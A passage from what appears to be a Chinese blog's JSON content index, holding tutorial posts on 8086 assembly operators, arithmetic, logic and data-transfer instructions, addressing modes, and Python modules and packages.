码编码的形式存储在存储单元中。\n\n符号常量\n\n使用符号定义语句定义的常量。\n\n#### 变量 \n\n变量是在程序运行中值发生变化的数据，变量有三种属性：段属性、偏移属性、类属性。\n\n段属性：段属性定义了变量所在段的段地址，其值必须在一个段寄存器中。\n\n偏移属性：表示变量相距段起始地址的字节数，一般用一个16位无符号数表示。\n\n类型属性：类型属性用来表示变量的字节长度。\n\n#### 标号\n\n汇编语言中的标号是机器指令存放位置的标识符号，即机器指令存放地址的符号表示，标号可以作为转移指令或重复控制指令的目的操作数，即指令要转向的目的地址。标号有以下三个属性：\n\n段属性：定义标号所在段的段地址。\n\n偏移属性：表示定义标号的语句相距其所在段起始地址的字节数。\n\n类型属性：标号的类型属性有两种，NEAR 类型和 FAR 类型。前者只能在定义该标号的段内使用，而 FAR 类型的标号即可以在段内使用，也可以在段外使用。\n\n#### 表达式\n\n指由常数、变量和标号通过某些运算符连接而成，根据其运算结果的类型分为数值表达式和地址表达式。表达式的运算符有算术运算符、逻辑运算符、关系运算符、属性返回运算符和属性设定运算符。\n\n算术运算符：+、-、\\*、/、MOD(取模)。其中 +、- 还可以用于地址表达式，有以下两种情况：\n\n地址表达式+常数    ；运算结果为地址\n\n地址表达式-常数     ；运算结果为地址\n\n注：地址表达式-地址表达式的结果为常数。\n\n逻辑运算符：AND、OR、NOT、XOR、SHL、SHR。\n\n关系运算符：EQ（等于）、NE（不等于）、LT（小于）、LE（小于等于）、GT（大于）、GE（大于等于）。\n\n格式：`表达式1 关系运算符 表达式2`\n\n属性返回运算符：包括类型返回运算符 TYPE，单元数返回运算符 LENGTH，总字节返回运算符 SIZE，段基址返回运算符 SEG 和偏移量返回运算符 OFFSET。\n\n格式：`属性返回运算符 地址表达式`\n\n属性返回运算符的运算对象必须是由变量名或标号名构成的地址表达式，运算结果是一个纯数值。\n\n类型返回运算符 TYPE：\n\n返回变量或标号类型属性的数值形式，变量或标号的类型和返回值的关系如下表：\n\n|      | 类型变量 | 运算结果 |\n| ---- | -------- | -------- |\n| 变量 | BYTE     | 1        |\n|      | WORD     | 2        |\n|      | DWORD    | 4        |\n|      | QWORD    | 8        |\n|      | TBYTE    | 10       |\n| 标号 | NEAR     | -1       |\n|      | FAR      | -2       |\n\n单元数返回运算符 LENGTH：返回变量所占的存储单元个数，该运算返回的结果根据定义该变量的伪指令中的第一个参数的形式来确定。若第一个参数的形式为重复字句 n DUP (数值表达式) ，则 LENGTH 的运算结果为重复因子 n。\n\neg：\n\n`DAB1 DB 12H,34H,56H,78H,9AH`\n\n`DAB2 2 DUP(12H),0ABH,0CDH`\n\n`MOV AX,LENGTH DAB1`    ；汇编成指令 ` MOV AX,1`\n\n`MOV AX,LENGTH DAB2`    ；汇编成指令 ` MOV AX,2`\n\n总字节返回运算符 SIZE ：返回变量所占的总字节数。\n\neg：\n\n`DAB1 DB 12H,34H,56H,78H,9AH`\n\n`DAB2 2 DUP(12H),0ABH,0CDH`\n\n`MOV AX,SIZE DAB1`    ；汇编成指令 ` MOV AX,5`\n\n`MOV AX,SIZE DAB2`    ；汇编成指令 ` MOV AX,4`\n\n段基址返回运算符 SEG：返回变量或标号所在段的段地址。\n\n偏移量返回运算符 OFFSET ：返回变量或标号在段内的偏移地址。\n\n属性设定运算符：\n\n段超越前缀运算符“：”：该运算符用于给变量、标号或地址表达式临时指定一个段属性。\n\n格式：`段寄存器名：地址表达式 或段名：地址表达式`\n\n类型设定运算符 PTR、THIS、SHORT。\n\n- PTR 运算符的功能就是地址表达式所确定的存储单元临时设定为指定类型（BYTE、WORD、DWORD、NEAR、FAR）这种临时设定的类型仅在含有该运算符的语句内有效， PTR 的格式如下：`PTR 地址表达式`\n- THIS 运算符的功能与 PTR 类似，但具体用法不同，格式如下：`变量名 EQU THIS 类型`\n- SHORT 运算符用于说明其后的标号在短距离（-128~127之间）内，一般用在向后转移的 JMP 指令中，格式如下：`JMP SHORT 目标地址`\n\n分离运算符：\n\n分离高字节运算符 HIGH：该运算的结果是其后的运算对象的高字节。\n\n分离低字节运算符 LOW：该运算的结果是其后的运算对象的低字节。\n\neg：\n\n`MOV BX,0ABCDH`\n\n`MOV HIGH BX`\n\n`MOV LOW BX`\n\n`MOV BX,AX`\n\n以上代码实现 BX 内容高、低字节的内容互换。\n\n运算符的优先级：\n\n- 先计算圆括号内的运算，如果圆括号有嵌套，按照由内而外的顺序。\n- 没有圆括号或对于一对圆括号内的运算按照运算符的优先级从高到低的顺序。\n- 对于优先级相同的运算按照从左到右的顺序计算。\n\n运算符的优先级表：\n\n| 运算符                           | 级别 | 运算符                 | 级别 |\n| -------------------------------- | ---- | ---------------------- | ---- |\n| LENGTH、SIZE                     | 1    | EQ、NE、LT、LE、GT、GE | 6    |\n| ：、PTR、OFFSET、SEG、TYPE、THIS | 2    | NOT                    | 7    |\n| HIGH、LOW                        | 3    | AND                    | 8    |\n| \\*、/、MOD、SHL、SHR             | 4    | OR、XOR                | 9    |\n| +、-                             | 5    | SHORT                  | 10   |\n\n","tags":["汇编"]},{"title":"8086运算、位移、处理器指令","url":"%2F2019%2F09%2F13%2F8086%E8%BF%90%E7%AE%97%E3%80%81%E4%BD%8D%E7%A7%BB%E3%80%81%E5%A4%84%E7%90%86%E5%99%A8%E6%8C%87%E4%BB%A4%2F","content":"\n### 算术运算指令\n\n##### 1.）加法指令\n\n不带进位加法指令 ADD\n\n格式：`ADD 目的操作数，源操作数`\n\n功能：将源操作数加到目的操作数上。\n\n说明：源操作数和目的操作数类型必须一致，并且两者不能同为存储器操作数（这一点适合于所有双操作数的算术运算指令）。影响标志位 OF、SF、ZF、AF、PF、CF。\n\neg：\n\n`MOV AL,05CH`\n\n`MOV BL,3BH`\n\n`ADD AL,BL`                                     ；将 AL 寄存器于 BL 寄存器的内容相加，结果送入 AL 寄存器。\n\n带进位加法指令 ADC\n\n格式：`ADC 目的操作数，源操作数`\n\n功能：与 ADD 基本相同，区别在于执行指令前将标志位 CF 的值加到目的操作数上。多用于多字节加法运算。\n\neg：\n\n`MOV DX,2FFFH`\n\n`MOV AX,0FF00H`\n\n`ADD AX,5678H`\n\n`ADC DX,1234H`\n\n该指实现多字节数 2FFFFFF00H 与 12345678H 相加，DX 中存放高8位 2FFFH 和 1234H，AX 中存放低8位 FF00H 和 5678H，执行第三步时，低8位进行相加，FF00H+5678H =5578H ，此时进位标志位 CF=1，执行第四部时，高8位进行相加，2FFFH+1234H=4233H，之后加上进位标志位的进位数， DX = 4234H。\n\n加1指令 INC\n\n格式：`INC 目的操作数`\n\n功能：将目的操作数加1。\n\n##### 2.）减法指令\n\n不带借位减法指令 SUB\n\n格式：`SUB 目的操作数，源操作数`\n\n功能：对目的操作数进行减去源操作数。\n\neg：\n\n`MOV AX,0C500H`\n\n`MOV BX,1234H`\n\n`SUB AX,BX`                                     ；将 AX 寄存器与 BX 寄存器的内容相减，结果送入 AX 寄存器。\n\n带借位减法指令 SBB\n\n格式：`SBB 目的操作数，源操作数`\n\n功能：与 SUB 基本相同，区别在于执行指令后将标志位 CF 的值也减去。\n\neg：\n\n`MOV DX,2FFFH`\n\n`MOV AX,0FF00H`\n\n`SUB AX,5678H`\n\n`SBB DX,1234H`\n\n该指实现多字节数 2FFFFFF00H 与 12345678H 相减，DX 中存放高8位 2FFFH 和 1234H，AX 中存放低8位 FF00H 和 5678H，执行第三步时，低8位进行相减，FF00H-5678H =A888H ，此时进位标志位 CF=0，执行第四部时，高8位进行相减，2FFFH-1234H=1DCBH，之后减去进位标志位的内容， DX = 0A888H，AX = 1DCBH。\n\n减1指令 DEC\n\n格式：`DEC 目的操作数`\n\n功能：将目的操作数减1。\n\n取补指令 NEG\n\n格式：` NEG 目的操作数`\n\n功能：对目的操作数取补码，相当于用0减去目的操作数，结果送回目的操作数。\n\n比较指令 CMP\n\n格式：`CMP 目的操作数，源操作数`\n\n功能：利用目的操作减去源操作数的结果设置标志位，但运算结果不送回目的操作数。\n\n##### 3.）乘法指令\n\n无符号乘法指令 MUL\n\n格式：`MUL 源操作数`\n\n功能：实现无符号乘法运算，若源操作数为字节操作数，则将 AL 与源操作数的乘积送入寄存器 AX ；若源操作数为字操作数，则将 AX 与源操作数乘积的高两字节送入寄存器 DX，低两字节送入寄存器 AX。 \n\n有符号乘法指令 IMUL\n\n格式：`IMUL 源操作数`\n\n功能：实现有符号乘法运算，若源操作数为字节操作数，则将 AL 与源操作数的乘积送入寄存器 AX ；若源操作数为字操作数，则将 AX 与源操作数乘积的高两字节送入寄存器 DX，低两字节送入寄存器 AX。 \n\n##### 4.）除法指令\n\n无符号除法指令 DIV\n\n格式：`DIV 源操作数`\n\n功能：实现无符号除法运算，若源操作数为字节操作数，则将寄存器 AX 的内容除以源操作数的商送入 AL ，余数送入 AH ；若源操作数为字操作数，则寄存器 DX ，AX的内容连接成的双字数据除以源操作数的商送入 AX，余数送入 DX。\n\neg：\n\n`DIV BL`       ；(AX)/(BL) → AL，余数送入 AH\n\n`DIV BX`        ；(DX,AX)/(BL) → AX，余数送入 DX\n\n`DIV WORD PTR [SI]`        ；(DX,AX)/((SI)) → AX，余数送入 DX\n\n有符号乘法指令 IDIV\n\n格式：`IDIV 源操作数`\n\n功能：实现有符号除法运算，若源操作数为字节操作数，则将寄存器 AX 的内容除以源操作数的商送入 AL ，余数送入 AH ；若源操作数为字操作数，则寄存器 DX ，AX的内容连接成的双字数据除以源操作数的商送入 AX，余数送入 DX。\n\n符号位扩展指令：\n\n格式：`CBW`\n\n功能：将寄存器 AL 中的数据的符号位扩展到 AH 中，若 AL 中的最高位（符号位）为0，则 AH == 00H，若 AL 中的最高位（符号位）为1，则 AH == 0FFH。\n\n格式：`CWD`\n\n功能：将寄存器 AX 中数据的符号位扩展到 DX 中。\n\n### 逻辑运算和位移指令\n\n##### 1.）逻辑运算\n\n按位取反指令 NOT\n\n格式：`NOT 目的操作数`\n\n功能：对目的操作数按位取反，结果送回目的操作数。\n\neg：\n\n`MOV AH,12H`\n\n` NOT AH`\n\n执行后，AH = 0EDH, 12H 转换为 二进制为 00010010 ，按位取反为 11101101，转换为16进制为 0EDH。\n\n按位与运算指令 AND\n\n格式：`AND 目的操作数，源操作数`\n\n功能：对目的操作数和源操作数执行按位的逻辑与操作，结果送回目的操作数。\n\nAND 指令常用于将寄存器或存储器操作数指定位清0。\n\n按位或运算指令 OR\n\n格式：`OR 目的操作数，源操作数`\n\n功能：对目的操作数和源操作数执行按位的逻辑或操作，结果送回目的操作数。\n\nOR 指令通常用于将寄存器或存储器操作数指定位置1。\n\n按位异或运算指令 XOR\n\n格式：`XOR 目的操作数，源操作数`\n\n功能：对目的操作数和源操作数执行按位的逻辑异或操作，结果送回目的操作数。\n\nXOR 指令通常用于将寄存器清0。\n\n测试指令 TEST\t\n\n格式：`TEST 目的操作数，源操作数`\n\n功能：对目的操作数和源操作数执行按位的逻辑与操作，但结果不送回目的操作数。\n\nTEST 指令常用于测试寄存器或存储器操作数的指定位内容是否为1。\n\n##### 2.）移位指令\n\n移位指令包括算术移位指令、逻辑移位指令和循环移位指令。移位指令必须在格式中指明目的操作数和移位次数，移位次数只能为1或由 CL 的内容规定，当要移多个为时，移位位数需存放在 CL计数寄存器中。\n\n算术移位指令 \n\n算术左移指令 SAL\n\n格式：`SAL 目的操作数，移位次数`\n\n功能：将目的操作数左移指定出次数，没左移一次，最低位补0，最高位送入 CF。对于有符号位数，每左移一次相当于乘2。\n\n算术右移指令 SAR\n\n格式：`SAR 目的操作数，移位次数`\n\n功能：将目的操作数右移指定的次数，没右移一次，最高位保持不变，最低位送入 CF 。对于有符号位数，每右移一次相当与除2。\n\n逻辑移位指令 \n\n逻辑左移指令 SHL\n\n格式：`SHL 目的操作数，移位次数`\n\n逻辑右移指令 SHR\n\n格式：`SHR 目的操作数，移位次数`\n\n逻辑移位指令通常用于无符号位数乘2、除2运算。\n\n循环移位指令\n\n循环左移指令 ROL\n\n格式：`ROL 目的操作数，移位次数`\n\n功能：将目的操作数右移指定的次数，每左移一次，左移前的最高位送入最低位以及 CF 。\n\n循环右移指令 ROR\n\n格式：`ROR 目的操作数，移位次数`\n\n功能：将目的操作数右移指定的次数，每右移一次，右移前的最低位送入最高位以及 CF 。\n\n带进位的循环左移指令 RCL\n\n格式：`RCL 目的操作数，移位次数`\n\n功能：将目的操作数左移指定的次数，每左移一次，左移前的最高位送入 CF ，CF 的内容送入最低位。\n\n带进位的循环右移指令 RCR\n\n格式：`RCR 目的操作数，移位次数`\n\n功能：将目的操作数右移指定的次数，每右移一次，右移前的最低位送入 CF ，CF 的内容送入最高位。\n\n### 处理器控制指令\n\n处理器控制指令包括标志操作指令和 CPU 控制指令。\n\n标志操作指令是一组可以对标志寄存器中的指定标志位进行设置的指令，都是零操作数指令。\n\nSTC ：置 CF = 1 \n\nCLC ：置 CF = 0\n\nCMC ：将 CF 取反\n\nSTD  ：置 DF = 1\n\nCLD  ：置 DF = 0\n\nSTI  ：置 IF = 1\n\nCLI  ：置 IF = 0\n\nCPU 控制指令\n\n空操作指令 NOP\n\n功能：执行一次空操作，消耗 CPU 时间。\n\n停机指令 HLT\n\n功能：使 CPU 处于暂停状态，等待中断或复位。\n\n锁总线指令 LOCK\n\n功能：封锁总线，使指令执行原子操作，用于多处理器并行系统。\n\n","tags":["汇编"]},{"title":"8086数据传送指令","url":"%2F2019%2F09%2F11%2F8086%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%2F","content":"\n### 数据传输指令\n\n用于在寄存器、存储器和输入输出端口之间传送数据或地址，可分为通用数据传送指令、累加器专用传送指令、地址传送指令和标志传送指令。\n\n#### 通用数据传送指令：\n\n传送指令 MOV\n\n格式：`MOV 目的操作数，源操作数`\n\n功能：将源操作数存入目的地址中，执行后，源操作数不变。对标志位无影响。\n\n应注意：源操作数和目的操作数的数据类型必须一致。立即数和 CS （代码段寄存器）不能作为目的操作数，不能将立即数直接送到段寄存器；两个存储器之间不能直接进行数据传送；两个段寄存器之间也不能直接进行数据传送。\n\nMOV 指令的传送方向示意图：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190913_175639.jpg)\n\n根据对传送方向的规定，MOV 指令有以下几种使用形式：\n\n1.）将立即数传送到通用寄存器或存储单元\n\nMOV 指令可以实现立即数到通用寄存器或存储单元的传送，源操作数为8位或16位的立即数，立即数的类型必须与寄存器字长或存储单元类型一致，8位立即数可以送入8位或16位寄存器，16位只能送入16位的寄存器或存储单元。\n\neg：\n\n`MOV CL,4BH `                     ；将8 位立即数 4BH 送入通用寄存器 CL \n\n`MOV DI,COUNT`                  ；COUNT 为符号常数，将其值传送到通用寄存器 DI \n\n`MOV DI,2008`                    ；将十进制数 2008 传送到 DS 段 DI 内容所指地址的字单元\n\n`MOV ES:[100H],'B'`          ；将字符 B 的 ASCII 码传送到 ES 段偏移 100H 的字节单元\n\n2.）寄存器之间的数据传送\n\nMOV 指令可以实现寄存器之间的数据传送，注意两个寄存器的数据类型必须一致，即两个寄存器应同为8位或16位寄存器。\n\neg：\n\n`MOV CL,DL`                        ；将8位通用寄存器 DL 的内容传送到8位通用寄存器 CH\n\n`MOV DI,BX`                        ；将16位通用寄存器 BX 的内容传送到 16 位通用寄存器 DI\n\n`MOV DS,AX`                        ；将16位通用寄存器 AX 的内容传到数据段寄存器 DS\n\n3.）寄存器与存储单元之间的数据传送\n\nMOV 指令可以实现寄存器到存储单元的数据传送，也可以实现存储单元到寄存器的数据传送。操作数类型必须一致。\n\neg：\n\n`MOV [200H],DX`                 ；将 DX 中的内容传送到 DS 段偏移 200H 的字单元\n\n`MOV AL,VAR`                       ；将符号地址 VAR 所指的字符单元内容传到 AL\n\n`MOV [SI],DS`                      ；将 DS 的内容传送到 SI 所指的字单元\n\n`MOV ES,DX`                          ；将 BX 所指的存储单元的内容传送到 ES\n\n堆栈操作指令：\n\n堆栈是在存储器中开辟的一个特殊区域，遵循“后进先出”的存取原则，段基地址存放在堆栈段寄存器 SS 中。堆栈操作只能在栈顶进行，堆栈的操作有进栈和出栈两种。\n\n1.）进栈指令 PUSH \n\n格式：`PUSH 源操作数`\n\n功能：修改堆栈指针 SP ，然后将源操作数压入栈顶单元。\n\n说明：源操作数可以是寄存器操作数、段寄存器操作数或存储器操作数。长度必须是16位。\n\n2.）出栈指令 POP\n\n格式：` POP 目的操作数`\n\n功能：将栈顶单元的内容弹出到目的地址中，然后修改堆栈指针 SP。\n\n说明：目的操作数可以是通用寄存器操作数、除 CS 以外的段寄存器操作数或字类型的存储器操作数，长度必须为16位。\n\n3.）交换指令 XCHG\n\n格式：`XCHG 目的操作数，源操作数`\n\n功能：将源操作数和目的操作数互换。\n\n#### 累计器专用传送指令\n\n1.）XTAT 换码指令\n\n一般用来实现码制之间的转换，又称查表转换指令。\n\n格式：`XTAT`\n\n功能：将累加器 AL 中的一个值转换为内存表格中的一个值，再传送到累加器 AL 中。\n\neg：\n\n`MOV BX, 4C02H`\n\n`MOV AL,08H`\n\n`XTAT`\n\n指令执行时，先计算 BX+ AL ，得到有效地址 4C0AH ，在将 4C0AH 所指的字节单元中的数据送入 AL 寄存器。\n\n2.）输入输出指令\n\n专门用于在输入输出端口和累加器之间进行数据传送的指令。\n\n（1.）输入指令 IN\n\n短格式：` IN AL/AX ,PORT`\n\n长格式：` IN AL/AX,DX`\n\n功能：从无符号数 PORT 或 DX 寄存器所指的端口输入一个字节数据到累加器 AL 中，或输入一个字数据到累加器 AX 中。\n\n说明：可以用一个无符号数 PORT 直接给出外设端口地址，取值为 0-FFH ，也可以用 DX 寄存器间接给出外设端口地址，取值 0-FFFFH。\n\neg：\n\n`IN AL,60H`               ；将 60H 端口中的数据读到 AL 中\n\n`IN AX,60H`               ；将 60H 端口中的数据读到 AX 中\n\n`MOV DX,3FFH`            ；将端口地址寄存到 DX 中\n\n`IN AL,DX `                  ；将 DX 所指定的端口中的数据读到 AL 中\n\n`IN AX,DX`                  ；将 DX 所指定的端口中的数据读到 AL 中，将 （DX）+1 所指定的端口中内容数据读到 AH 中。\n\n（2.）输出指令 OUT\n\n短格式：`OUT PORT ,AL/AX`\n\n长格式：`OUT DX,AL/AX`\n\n功能：实现输出，其数据传送方向与 IN 指令相反。\n\n#### 地址传送指令\n\n地址传送指令实现操作数地址信息的传送。\n\n1.）有效地址送寄存器指令 LEA\n\n格式：`LEA 通用寄存器，源操作数`\n\n功能：将源操作数的偏移地址送入通用寄存器。\n\n说明：指令中的目的操作数只能使用 16 位通用寄存器，不能使用段寄存器，源操作数只能是存储器操作数。\n\neg：\n\n`MOV BX,0200H`\n\n`MOV SI,3000H`\n\n`LEA BP.[BX+SI+6]`   ；将源操作数的有效地址 3206H 送到 BP 寄存器中\n\n2.）指针送寄存器和 DS 指令 LDS\n\n格式：`LDS 通用寄存器，源操作数`\n\n功能：将源操作数指示的双字节内容送入通用寄存器和 DS ，低两字节内容送到通用寄存器，高两字节内容送入 DS。\n\n说明：指令中的目的操作数只能使用 16 位通用寄存器，不能使用段寄存器，源操作数只能是存储器操作数。\n\neg：\n\n`LDS BX,[100H]`\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190913_175651.jpg)\n\n3.）指针送寄存器和 ES 指令 LES\n\nLES 和 LDS 的区别在于，传送地址时将高地址两字节送入 ES ，而不是 DS。\n\n#### 标志传送指令\n\n标志传送指令专门用于对标志寄存器进行操作。\tLAHF 和 SAHF 只对标志寄存器的低8位进行操作，而 PUSHF 和 POPF 对整个标志寄存器进行操作。\n\n1.）取标志指令 LAHF\n\n格式：`LAHF`\n\n功能：将标志寄存器的低8位传送到累加器 AH。\n\n标准寄存器中低8位中有五个状态标志位，LAHF 指令将这些标志位传送到 AH 中的对应位。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190913_175658.jpg)\n\n2.）置标志指令 SAHF\n\n格式：`SAHF`\n\n功能：将累加器 AH 中的内容送到标志寄存器的低8位。影响低8位中的五种状态标志位。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190913_175702.jpg)\n\n3.）标志进栈/出栈指令 PUSHF/POPF\n\n格式：`PUSHF`\n\n格式：`POPF`\n\n功能：与 PUSH 不同之处在于，压入堆栈的是标志寄存器的内容；与 POP 不同之处在于，弹出的栈顶元素进入标志寄存器中。\n\n\n\n\n\n\n\n---\n\n[^]:  注：本篇中所有配图均来自《汇编语言程序设计实用教程》--任向民 ，如有侵权，请联系作者删除！\n\n","tags":["汇编"]},{"title":"模块的概念、包","url":"%2F2019%2F09%2F10%2F%E6%A8%A1%E5%9D%97%E7%9A%84%E6%A6%82%E5%BF%B5%2F","content":"\n### 模块的概念\n\n概念：一个.py文件就是一个模块，文件中存储着相似的多种功能。\n\n种类：Python标志库、第三方模块、应用程序自定义模块。\n\n模块的导入方式：\n\n##### import 语句：\n\n`import [module1],[modeule1]...`\n\neg：\n\n自定义 .py 文件 cal.py ，内容写入如下代码：\n\n```python\ndef add(x,y):\n\treturn (x+y)\ndef sub(x,y):\n\treturn (x-y)\nx=3\n```\n\n新建一个 .py 文件，使用 import 导入模块 cal：\n\n```python\nimport cal\nprint(cal.add(1,2))  #3\nprint(cal.sub(2,1))  #1\nprint(cal.x)         #3\n```\n\nimport 导入模块过程：\n\n1.模块路径的搜索：\n\n```python\nimport sys\npython(sys.path) \n#['D:\\\\pycharm\\\\wook\\\\week1', \n'D:\\\\pycharm\\\\wook', \n'D:\\\\pycharm\\\\PyCharm 2019.2.1\\\\helpers\\\\pycharm_display', 'D:\\\\Envirement\\\\Python3\\\\Python37\\\\python37.zip', 'D:\\\\Envirement\\\\Python3\\\\Python37\\\\DLLs', 'D:\\\\Envirement\\\\Python3\\\\Python37\\\\lib', \n'D:\\\\Envirement\\\\Python3\\\\Python37', 'D:\\\\Envirement\\\\Python3\\\\Python37\\\\lib\\\\site-packages', \n'D:\\\\pycharm\\\\PyCharm 2019.2.1\\\\helpers\\\\pycharm_matplotlib_backend']\n\n```\n\n2.从第一个路径下开始寻找相关模块。\n\n3.解释器解释模块内所有代码\n\n##### from 从模块中调用方法\n\n只加载指定调用的模块。\n\neg：\n\n从 cal.py 中调用 add 方法：\n\n```python\nfrom cal import add \nprint(add(1,2))  #3\nprint(cal.add(2,1))  #name 'cal' is not defined\n\nfrom cal import * #加载所有变量\nprint(add(1,2))  #3\nprint(x)         #3\n```\n\n当调用的模块中方法名和同文件中的函数名重复时执行相对位置较后的：\n\n```python\ndef f():\n\tprint('ok1')\ndef f():\n\tprint('ok2')\nf()             #ok2\n*******************************\nfrom cal import *\ndef add(x,y):\n\tprint(x+y+2)\nadd(1,2)        #5\n*******************************\ndef add(x,y):\n\tprint(x+y+2)\nfrom cal import *\nadd(1,2)         #3\n```\n\n模块中方法调用时取别名：\n\n```python\nfrom cal import add as a\nprint(a.(1,2))      #3\n```\n\n### 包的概念\n\n为了避免模块名冲突，python 又引入了按目录来组织模块的方法，称为包，包是用来组织模块的文件夹。每个包下包含一个 \\_init\\_ .py 文件。\n\n包的调用：\n\neg：\n\nweb 包下 py 文件内容分别为：\n\n```python\n#logger.py\ndef logger():\n\tprint('logging')\n```\n\n调用 web 包中的 log 模块\n\n```python\nfrom web import log #一层调用\nlog.logger()   #logging\n\nfrom web.web1 import log #二层调用\nlog.logger()   #logging\n\nfrom web.web1.log import log #二层调用模块中的方法\nlogger()       #logging\n```\n\n调用包的过程：\n\n`import [package]` 只执行 \\_init\\_.py 文件。\n\n```python\nimport web \nprint(web.main.x)  #module 'web' has no attribute 'main'\n\nfrom web import main\nprint(main.x)     #3\n```\n\n### 目录结构\n\n新建项目如下：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/55555.png)\n\n各文件中代码如下：\n\n```python\n#logger.py\ndef log_function():\n\tprint(logging)\n\t\n#main.py\nimport logger\ndef main():\n\tlogger.log_function()\n\n#bin.py\nfrom mudule import main\nmain.main()\n```\n\n在 pycharm 中执行结果：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/666.png)\n\n在命令行的执行结果：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/44.png)\n\n这种调用，在 python 解释器中可执行成功，但是在命令行下不能执行成功，报错内容为没有模块名字为 mudule 。\n\n为什么在 pycharm 中没有报错呢？\n\n原因在于 python 解释器在第一层路径 D:/pycharm/ATM/bin/bin.py 中找不到 mudule后， 自动搜索路径父级路径 D:/pycharm/ATM/bin ，该路径中仍然找不到，于是继续寻找父路径  D:/pycharm/ATM，该路径中存在 mudule ，于是执行成功。\n\n而在命令行下却因为第一层找不到该模块而报错。\n\n解决方法如下：\n\n```python\nimport os\nimport sys\nWAY=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  #D:\\pycharm\\ATM\nsys.path.append(WAY)  #自动添加搜索路径\n```\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/445.png)\n\n### \\_\\_name\\_\\_变量\n\n在同级目录下新建 name.py 和 function.py 观察如下代码的执行效果：\n\n```python\n#name.py\ndef foo()\n\tprint('foo...')\nprint(__name__)     #__main__\n\n#function.py\nimport function     #function\n```\n\n\\_\\_name\\_\\_ 变量返回值具有如下规则：\n\n在一个文件中执行时，\\_\\_name\\_\\_ 返回 \\_\\_main\\_\\_ ，当在调用处的文件中执行时，\\_\\_name\\_\\_ 返回该文件的名字。\n","tags":["python"]},{"title":"python正则实现计算器","url":"%2F2019%2F09%2F09%2Fpython%E6%AD%A3%E5%88%99%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8%2F","content":"\n","tags":["python"]},{"title":"指令系统","url":"%2F2019%2F09%2F08%2F%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%2F","content":"\n### 指令系统概述\n\n计算机的指令系统是指其处理器所能执行的各种指令的集合。指令有机器指令和汇编指令两种形式，机器指令用二进制代码表示，便于机器识别；汇编指令则是用助记符来表示机器指令。\n\n#### 机器指令格式：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_100736.jpg)\n\n机器指令通常由操作码字段和操作数字段两部分组成。\n\n操作码字段指示计算机所要执行的操作类似。操作数字段指出指令执行操作所需的数据和操作结果存放的位置。\n\n根据一条指令操作数字段提供的操作数个数，可将指令分为以下3种：\n\n双操作数指令：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_100749.jpg)\n\n双操作数中的操作数字段提供两个操作数，中间用逗号分隔，逗号前面的数称为目的操作数，逗号后面的数称为源操作数。\n\neg：`MOV AL,05H`   ； 将8位立即数 05H 存入寄存器 AL中\n\neg：`MOV AL,BL`    ；将寄存器 AL 和 BL 中的数相加，结果放入 AL 中\n\n单操作数指令：\n\n操作数字段只提供一个操作数。这类指令有两种情况，一是只需要一个操作数；二是指令中只需给出一个指令，另一个操作数是隐含指出的。\n\neg：`INC AX`    ；加1指令，将 寄存器AX的内容加1\n\neg：`PUSH BX`  ；进栈指令，只需给出源操作数，目的操作数是栈顶单元\n\n零操作数指令：\n\n这类指令只有操作码字段，没有操作数字段。\n\neg：`HLT` ；停机指令\n\neg：`CBW` ；符号扩展指令，隐含的操作数在 AL 和 AX 中\n\n单操作数指令和零操作数指令格式如下：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_100754.jpg)\n\n#### 寻址技术\n\n指令中操作数字段可能直接给出操作数，也可能给出操作数的存放地址，若指令中给出的是操作数的存放地址，则在执行指令前要根据指令中的地址信息来寻找操作数，这个过程叫做寻址。\n\n##### 立即寻址：\n\n立即寻址方式是指操作数直接包含在指令中，紧跟在操作码之后，作为指令的一部分存放在代码段中。立即寻址方式只能用于源操作数，不能用于目的操作数。\n\neg：`MOV BL,20H`     ；将8位立即数 20H 存入寄存器 BL 中\n\neg：`MOV AX,12BCH`  ；将16位立即数 12BCH 存入寄存器 AX 中\n\neg：`MOV BX,\"AB\"`    ；将字符串 \"AB\" 存入寄存器 BX 中\n\n##### 寄存器寻址：\n\n寄存器寻址方式是指操作数存放在寄存器中，指令中直接给出寄存器名，通过寄存器名找到操作数。寄存器寻址即可用于源操作数，又可用于目的操作数。\n\neg：`MOV CX,1234H`  ；将16位立即数 1234H 放入寄存器 CX 中\n\neg：`MOV BL,AL`       ；将寄存器 AL 中的内容存入寄存器 BL 中\n\neg：`MOV DS,BX `       ；将通用寄存器 BX 中的内容存入段寄存器 DS\n\n##### 存储器寻址方式：\n\n操作数在存储器单元中，存储器单元作为操作数时，CPU 必须通过指令提供的信息计算出该存储单元的物理地址，物理地址由段基址和偏移量组成。\n\n在 80X86 中，根据对存储器单元地址偏移量的不同计算方式，可以分为以下5中不同的寻址方式。\n\n###### 直接寻址方式：\n\n直接寻址方式是指指令所需的操作数存放在存储器单元中，其地址偏移量由指令代码中的偏移量直接给出。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_112823.jpg)\n\n操作数格式：`[常数]|变量名`\n\n源操作数采用直接寻址方式：\n\neg：`MOV BL,[100H]`     ；将当前数据段偏移量为 100H 的字节单元内容存入 BL 中\n\neg：`MOV AX,DW_WORD`   ；将 DW_WORD 指向的字单元内容存入 